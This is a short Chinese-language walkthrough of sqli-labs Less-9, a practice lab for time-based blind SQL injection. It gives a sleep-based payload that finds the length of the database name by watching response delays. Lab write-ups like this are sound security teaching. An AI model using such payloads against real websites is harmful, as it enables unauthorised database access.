title: sql-labs 9关

**Less-9** GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注/基于’的时间盲注)

注入语句：id=1' and if(length(database())>3 ,sleep(5),1) --+

因为你不知道数据库名是几个字母，所以先让数字大于3进行判断，然后依次增加。

![image-20220330100800597](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330100800597.png)

如果sleep函数不起作用了，说明数据库名可能等于这个数。这时你就能判断它的数据库名啦。

![image-20220330100906860](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330100906860.png)